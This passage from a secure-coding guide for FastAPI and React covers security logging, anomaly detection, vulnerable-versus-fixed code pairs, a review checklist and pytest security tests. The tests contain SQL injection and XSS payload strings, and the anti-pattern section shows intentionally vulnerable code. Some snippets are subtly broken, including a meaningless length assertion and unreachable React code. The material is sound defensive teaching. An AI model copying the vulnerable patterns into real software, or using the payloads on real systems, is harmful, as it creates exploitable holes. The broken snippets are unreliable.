        self.logger.warning(
            f"CONFIG_CHANGE | user={user_id} | setting={setting} | "
            f"old={old_value} | new={new_value}"
        )

    def log_suspicious_activity(
        self,
        user_id: Optional[str],
        ip: str,
        description: str,
        severity: str = "medium"
    ):
        self.logger.warning(
            f"SUSPICIOUS | user={user_id or 'anonymous'} | ip={ip} | "
            f"severity={severity} | desc={description}"
        )

security_log = SecurityLogger()

# Usage in endpoints
@app.post("/login")
async def login(credentials: LoginRequest, request: Request):
    ip = request.client.host

    try:
        user = await authenticate(credentials.email, credentials.password)
        security_log.log_login_attempt(credentials.email, ip, True)
        return create_session(user)

    except AuthenticationError as e:
        security_log.log_login_attempt(
            credentials.email, ip, False, str(e)
        )
        raise HTTPException(401, "Invalid credentials")
```

### Anomaly Detection

```python
from collections import defaultdict
from datetime import datetime, timedelta

class AnomalyDetector:
    def __init__(self):
        self.user_activity = defaultdict(list)

    def check_login_anomaly(self, user_id: str, ip: str, location: str) -> bool:
        """Detect suspicious login patterns"""
        recent_logins = self.user_activity[user_id]
        cutoff = datetime.utcnow() - timedelta(hours=1)
        recent_logins = [l for l in recent_logins if l['time'] > cutoff]

        # Check for impossible travel
        if recent_logins:
            last_login = recent_logins[-1]
            if last_login['location'] != location:
                time_diff = (datetime.utcnow() - last_login['time']).seconds
                # If location changed in < 1 hour, suspicious
                if time_diff < 3600:
                    return True

        # Check for multiple IPs
        unique_ips = set(l['ip'] for l in recent_logins)
        if len(unique_ips) > 5:  # More than 5 IPs in 1 hour
            return True

        # Record this login
        self.user_activity[user_id].append({
            'time': datetime.utcnow(),
            'ip': ip,
            'location': location
        })

        return False

anomaly_detector = AnomalyDetector()

@app.post("/login")
async def login(credentials: LoginRequest, request: Request):
    user = await authenticate(credentials.email, credentials.password)

    ip = request.client.host
    location = await get_location_from_ip(ip)

    if anomaly_detector.check_login_anomaly(user.id, ip, location):
        security_log.log_suspicious_activity(
            user.id, ip,
            "Anomalous login pattern detected",
            severity="high"
        )
        # Require additional verification
        await send_verification_email(user.email)
        return {"requires_verification": True}

    return create_session(user)
```

## 10. Anti-Patterns (NEVER DO THESE)

### Security Through Obscurity

```python
# BAD: Hiding security in obscure logic
def is_admin(user_id):
    # "Secret" admin check
    return user_id % 7 == 0

# GOOD: Explicit role check
def is_admin(user_id):
    user = db.query(User).filter(User.id == user_id).first()
    return user.role == Role.ADMIN
```

### Client-Side Only Validation

```javascript
// BAD: Only validating on frontend
function submitForm() {
  if (email.length < 5) return;  // Client-side only!
  fetch('/api/submit', { body: { email } });
}

// GOOD: Validate on both sides
function submitForm() {
  // Frontend validation for UX
  if (!isValidEmail(email)) {
    showError("Invalid email");
    return;
  }
  // Backend will also validate
  fetch('/api/submit', { body: { email } });
}
```

```python
# Backend always validates
@app.post("/api/submit")
async def submit(data: EmailData):  # Pydantic validates
    # Additional business logic validation
    if await email_exists(data.email):
        raise HTTPException(400, "Email already registered")
    return process_submission(data)
```

### Hardcoded Secrets

```python
# BAD: Hardcoded credentials
DATABASE_URL = "postgresql://admin:password123@localhost/db"
API_KEY = "sk-1234567890abcdef"

# GOOD: Environment variables
import os
from dotenv import load_dotenv

load_dotenv()

DATABASE_URL = os.getenv("DATABASE_URL")
API_KEY = os.getenv("API_KEY")

if not DATABASE_URL or not API_KEY:
    raise ValueError("Missing required environment variables")
```

### Mass Assignment

```python
# BAD: Accepting all fields
@app.put("/api/users/{user_id}")
async def update_user(user_id: int, data: dict):
    user = db.query(User).filter(User.id == user_id).first()
    for key, value in data.items():
        setattr(user, key, value)  # Attacker can set 'role' or 'is_admin'!
    db.commit()

# GOOD: Explicit field whitelist
class UserUpdate(BaseModel):
    name: Optional[str]
    email: Optional[str]
    bio: Optional[str]
    # Note: role, is_admin NOT included

@app.put("/api/users/{user_id}")
async def update_user(user_id: int, data: UserUpdate):
    user = db.query(User).filter(User.id == user_id).first()
    for key, value in data.dict(exclude_unset=True).items():
        setattr(user, key, value)
    db.commit()
```

### Using == for Password Comparison

```python
# BAD: Timing attack vulnerable
def verify_password(input_password, stored_hash):
    return input_password == stored_hash  # Vulnerable to timing attacks!

# GOOD: Constant-time comparison
import hmac

def verify_password(input_password, stored_hash):
    return hmac.compare_digest(
        input_password.encode(),
        stored_hash.encode()
    )

# BETTER: Use password hashing library
from passlib.context import CryptContext

pwd_context = CryptContext(schemes=["argon2"])

def verify_password(input_password, stored_hash):
    return pwd_context.verify(input_password, stored_hash)
```

### Ignoring Rate Limits

```python
# BAD: No rate limiting
@app.post("/api/send-email")
async def send_email(to: str, body: str):
    await email_service.send(to, body)
    return {"sent": True}
# Attacker can spam thousands of emails!

# GOOD: Rate limiting
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@app.post("/api/send-email")
@limiter.limit("5/minute")  # Max 5 emails per minute
async def send_email(request: Request, to: str, body: str):
    await email_service.send(to, body)
    return {"sent": True}
```

### Verbose Error Messages

```python
# BAD: Leaking internal details
@app.post("/login")
async def login(email: str, password: str):
    user = db.query(User).filter(User.email == email).first()
    if not user:
        raise HTTPException(404, "User not found")  # Reveals user exists!
    if not verify_password(password, user.password_hash):
        raise HTTPException(401, "Incorrect password")
    return create_session(user)

# GOOD: Generic error message
@app.post("/login")
async def login(email: str, password: str):
    user = db.query(User).filter(User.email == email).first()
    if not user or not verify_password(password, user.password_hash):
        # Same message for both cases
        raise HTTPException(401, "Invalid credentials")
    return create_session(user)
```

## Code Review Checklist

When reviewing code for security:

### Input Validation
- [ ] All user inputs validated (type, length, format)
- [ ] Dangerous characters escaped or rejected
- [ ] File uploads validated (type, size, content)
- [ ] API parameters use strict types (Pydantic models)

### Authentication
- [ ] Passwords hashed with strong algorithm (argon2/bcrypt)
- [ ] Session IDs cryptographically random
- [ ] Session timeout implemented
- [ ] MFA available for sensitive actions
- [ ] Brute force protection in place

### Authorization
- [ ] Every endpoint checks user permissions
- [ ] IDOR prevention (ownership verification)
- [ ] Role-based access control implemented
- [ ] Privilege escalation prevented
- [ ] No mass assignment vulnerabilities

### Data Protection
- [ ] Sensitive data encrypted at rest
- [ ] HTTPS enforced in production
- [ ] PII logged/exposed minimally
- [ ] Secrets in environment variables (not code)
- [ ] Database backups encrypted

### Output Encoding
- [ ] HTML output escaped (XSS prevention)
- [ ] JSON responses properly encoded
- [ ] SQL queries parameterized
- [ ] Framework auto-escape enabled

### Security Headers
- [ ] CSP configured
- [ ] X-Frame-Options set
- [ ] HSTS enabled
- [ ] X-Content-Type-Options set
- [ ] Referrer-Policy configured

### Error Handling
- [ ] Generic error messages to users
- [ ] Detailed errors logged securely
- [ ] No stack traces in production
- [ ] Failed attempts logged

### Dependencies
- [ ] Dependencies up to date
- [ ] Vulnerability scanning enabled
- [ ] Known CVEs addressed
- [ ] Minimal dependencies used

### CSRF Protection
- [ ] State-changing operations protected
- [ ] CSRF tokens implemented
- [ ] SameSite cookies configured
- [ ] Origin validation performed

### Logging & Monitoring
- [ ] Security events logged
- [ ] Authentication attempts tracked
- [ ] Suspicious activity detected
- [ ] Logs protected from tampering

## Framework-Specific Guidance

### FastAPI Security

```python
from fastapi import FastAPI, Depends, HTTPException
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from jose import jwt, JWTError

security = HTTPBearer()

async def get_current_user(
    credentials: HTTPAuthorizationCredentials = Depends(security)
) -> User:
    try:
        payload = jwt.decode(
            credentials.credentials,
            SECRET_KEY,
            algorithms=["HS256"]
        )
        user_id = payload.get("sub")
        if not user_id:
            raise HTTPException(401, "Invalid token")

        user = await get_user_by_id(user_id)
        if not user:
            raise HTTPException(401, "User not found")

        return user

    except JWTError:
        raise HTTPException(401, "Invalid token")

@app.get("/api/protected")
async def protected_route(current_user: User = Depends(get_current_user)):
    return {"message": f"Hello {current_user.name}"}
```

### React Security

```jsx
import DOMPurify from 'dompurify';

function UserComment({ comment }) {
  // Auto-escaped by React
  return <p>{comment.text}</p>;

  // If you must use HTML
  const sanitized = DOMPurify.sanitize(comment.html);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// CSRF token in requests
async function apiCall(endpoint, data) {
  const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

  const response = await fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify(data)
  });

  return response.json();
}
```

## Testing for Security Vulnerabilities

```python
import pytest
from fastapi.testclient import TestClient

def test_sql_injection_prevention():
    """Ensure SQL injection is prevented"""
    client = TestClient(app)

    # Attempt SQL injection
    malicious_input = "' OR '1'='1"
    response = client.get(f"/api/users?email={malicious_input}")

    # Should not return all users
    assert response.status_code in [400, 404]
    assert len(response.json()) != "all_users_count"

def test_xss_prevention():
    """Ensure XSS is prevented"""
    client = TestClient(app)

    malicious_script = "<script>alert('XSS')</script>"
    response = client.post("/api/comments", json={
        "text": malicious_script
    })

    assert response.status_code == 201

    # Verify script is escaped in output
    get_response = client.get(f"/api/comments/{response.json()['id']}")
    assert "<script>" not in get_response.text
    assert "&lt;script&gt;" in get_response.text or "escaped" in get_response.text

def test_idor_prevention():
    """Ensure IDOR is prevented"""
    client = TestClient(app)

    # Login as user1
    user1_token = get_auth_token("user1")

    # Try to access user2's document
    response = client.get(
        "/api/documents/user2_document_id",
        headers={"Authorization": f"Bearer {user1_token}"}
    )

    # Should be forbidden
    assert response.status_code == 403

def test_csrf_protection():
    """Ensure CSRF protection is active"""
    client = TestClient(app)

    # Attempt state-changing operation without CSRF token
    response = client.post("/api/transfer", json={
        "to": "attacker",
        "amount": 1000
    })

    # Should be rejected
    assert response.status_code == 403

def test_rate_limiting():
    """Ensure rate limiting works"""
    client = TestClient(app)

    # Make requests until rate limited
    for i in range(100):
        response = client.post("/api/login", json={
            "email": "test@example.com",
            "password": "wrong"
        })

        if response.status_code == 429:
            break

    # Should eventually be rate limited
    assert response.status_code == 429
```

## Additional Resources

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **OWASP Cheat Sheets**: https://cheatsheetseries.owasp.org/
- **CWE Top 25**: https://cwe.mitre.org/top25/
- **Security Headers**: https://securityheaders.com/
- **Mozilla Observatory**: https://observatory.mozilla.org/

## Summary: Security Mindset

1. **Assume Breach**: Design systems assuming attackers will get in
2. **Defense in Depth**: Layer multiple security controls
3. **Fail Secure**: Default to denying access on errors
4. **Least Privilege**: Grant minimum necessary permissions
5. **Validate Everything**: Never trust user input
6. **Log Suspicious Activity**: Monitor and alert on anomalies
7. **Keep Updated**: Patch dependencies regularly
8. **Test Security**: Include security tests in CI/CD
9. **Security by Design**: Consider security from the start
10. **Learn Continuously**: Security landscape constantly evolves

When in doubt, **deny access** and **log the attempt**. It's better to be overly cautious than to leave vulnerabilities exploitable.


## Quality Tests

### Threat Coverage Test
- Analysis covers relevant OWASP categories for the system type
- **PASS:** Each relevant threat category assessed, even if risk is low
- **FAIL:** Only obvious threats checked, subtle attack vectors ignored

### Recovery Path Test
- Each vulnerability has a specific remediation path
- **PASS:** Mitigation includes exact code changes or configuration steps
- **FAIL:** Advice is generic ('use encryption') without implementation specifics

